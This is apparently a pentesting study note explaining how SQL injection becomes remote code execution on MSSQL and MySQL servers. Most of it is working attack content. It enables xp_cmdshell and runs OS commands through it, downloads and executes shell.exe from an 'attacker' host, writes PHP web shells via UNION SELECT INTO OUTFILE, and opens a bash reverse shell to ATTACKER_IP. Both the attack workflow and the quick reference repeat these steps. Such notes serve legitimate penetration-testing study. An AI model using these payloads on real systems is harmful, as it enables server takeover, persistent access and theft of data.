# SQL Injection – Manual Code Execution (RCE)

## Purpose

SQL Injection can sometimes lead directly to **Remote Code Execution (RCE)** on the underlying operating system.

This is one of the most critical impacts of SQLi because it allows attackers to:

- execute OS commands
- obtain reverse shells
- dump credentials
- pivot deeper into the network
- fully compromise the server

The method used depends heavily on the **DBMS type**.

---

# MSSQL – xp_cmdshell

Microsoft SQL Server provides a powerful stored procedure:

```
xp_cmdshell
```

This allows execution of Windows commands directly from SQL.

By default:

```
xp_cmdshell is disabled
```

Requires administrative privileges to enable.

---

# Step 1 – Connect to MSSQL

Using Impacket:

```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

---

# Step 2 – Enable xp_cmdshell

Enable advanced options:

```sql
EXECUTE sp_configure 'show advanced options', 1;
```

Apply configuration:

```sql
RECONFIGURE;
```

Enable xp_cmdshell:

```sql
EXECUTE sp_configure 'xp_cmdshell', 1;
```

Apply configuration again:

```sql
RECONFIGURE;
```

---

# Step 3 – Execute OS Commands

xp_cmdshell executes Windows commands.

---

## Example

```sql
EXECUTE xp_cmdshell 'whoami';
```

---

## Example output

```
nt service\mssql$sqlexpress
```

Confirms:

```
command execution achieved
```

---

# Common Commands

## identify user

```sql
EXEC xp_cmdshell 'whoami';
```

---

## check privileges

```sql
EXEC xp_cmdshell 'whoami /priv';
```

---

## view directory

```sql
EXEC xp_cmdshell 'dir';
```

---

## network info

```sql
EXEC xp_cmdshell 'ipconfig';
```

---

## download payload

```sql
EXEC xp_cmdshell 'powershell -c wget http://attacker/shell.exe -OutFile C:\temp\shell.exe';
```

---

## execute reverse shell

```sql
EXEC xp_cmdshell 'C:\temp\shell.exe';
```

---

# MySQL – Writing Web Shells

MySQL does not provide a direct equivalent to xp_cmdshell.

Instead, we leverage:

```
SELECT INTO OUTFILE
```

to write executable files.

Common approach:

```
write PHP webshell to webroot
```

---

# Example Web Shell

```php
<?php system($_GET['cmd']); ?>
```

Allows command execution via:

```
?cmd=
```

---

# SQL Injection Payload

```sql
' UNION SELECT 
"<?php system($_GET['cmd']);?>",
null,
null,
null,
null 
INTO OUTFILE "/var/www/html/tmp/webshell.php"-- //
```

---

# Accessing the Shell

Open in browser:

```
http://target/tmp/webshell.php?cmd=id
```

---

## Example output

```
uid=33(www-data) gid=33(www-data)
```

Confirms:

```
code execution as web server user
```

---

# Common Web Shell Variants

## basic PHP shell

```php
<?php system($_REQUEST['cmd']); ?>
```

---

## shell_exec variant

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

---

## passthru variant

```php
<?php passthru($_GET['cmd']); ?>
```

---

# Finding Writable Directories

Common Linux webroots:

```
/var/www/html/
/var/www/
/srv/www/
/usr/share/nginx/html/
```

---

# Identify webroot via config

Apache:

```
/etc/apache2/apache2.conf
```

Nginx:

```
/etc/nginx/nginx.conf
```

---

# Confirm write permissions

Test file:

```sql
UNION SELECT 'test'
INTO OUTFILE '/var/www/html/test.txt'
```

Browse:

```
http://target/test.txt
```

---

# Reverse Shell Example

## PHP reverse shell

```php
<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

---

# Attack Workflow

## MSSQL

### enable xp_cmdshell

```sql
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
```

---

### execute command

```sql
EXEC xp_cmdshell 'whoami'
```

---

## MySQL

### confirm FILE privilege

```sql
SELECT user()
```

---

### confirm writable directory

```sql
SELECT @@secure_file_priv
```

---

### write web shell

```sql
UNION SELECT "<?php system($_GET['cmd']);?>"
INTO OUTFILE '/var/www/html/shell.php'
```

---

### execute command

```
shell.php?cmd=id
```

---

# Key Differences Between MSSQL and MySQL RCE

| DBMS | Method | Difficulty |
|------|--------|------------|
| MSSQL | xp_cmdshell | easier |
| MySQL | INTO OUTFILE | moderate |
| PostgreSQL | COPY TO PROGRAM | moderate |
| Oracle | Java stored procedures | complex |

---

# Indicators of RCE Opportunity

- FILE privilege enabled
- writable web directories
- exposed database credentials
- high DB privileges (DBA)
- ability to write files
- ability to execute stored procedures

---

# Key Takeaways

- SQLi can lead directly to OS command execution
- MSSQL xp_cmdshell provides direct command execution
- MySQL requires file write primitive
- web shells enable persistent access
- RCE often leads to full system compromise

---

# Quick Reference

## enable xp_cmdshell

```sql
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
```

---

## execute command

```sql
EXEC xp_cmdshell 'whoami'
```

---

## write web shell

```sql
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php'
```

---

## execute shell command

```
shell.php?cmd=id
```

---

# Tags

#sql-injection  
#rce  
#xp_cmdshell  
#outfile  
#webshell  
#mssql  
#mysql  
#pentesting  
#privilege-escalation  
#owasp  
#obsidian